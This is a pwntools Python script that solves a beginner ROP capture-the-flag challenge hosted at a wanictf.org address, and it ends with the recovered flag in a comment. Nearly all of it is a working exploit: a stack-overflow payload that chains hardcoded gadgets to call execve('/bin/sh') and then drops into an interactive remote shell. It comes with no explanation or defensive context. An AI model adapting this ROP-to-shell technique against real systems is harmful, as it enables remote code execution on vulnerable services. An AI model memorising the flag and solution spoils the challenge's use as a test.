from pwn import *

HOST = "beginners-rop-pwn.wanictf.org"
PORT = 9005
file = "./chall"
e = ELF(file)

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

rop_pop_rax = 0x00401371
rop_pop_rdi_jle_mov_eax_leave = 0x0040148f
rop_mov_rdi_rsp = 0x0040139c
rop_syscall = 0x004013af
rop_xor_rsi_rsi = 0x0040137e
rop_xor_rdx_rdx = 0x0040138d
rop_ret = 0x0040101a

binsh = b"/bin/sh\x00"
pld = binsh + b"\x00"*(40-len(binsh))
pld += p64(rop_mov_rdi_rsp) # rdi = /bin/sh
pld += binsh
pld += p64(rop_xor_rsi_rsi) # rsi = 0
pld += p64(rop_xor_rdx_rdx) # rdx = 0
pld += p64(rop_pop_rax)
pld += p64(59) # SYS_execve
pld += p64(rop_syscall)
#print(len(pld))
pld += b"\x00"*(96-len(pld))

#pld = b"A"*40

io.sendlineafter(b"> ", pld)

io.interactive()
#FLAG{h0p_p0p_r0p_po909090p93r!!!!}
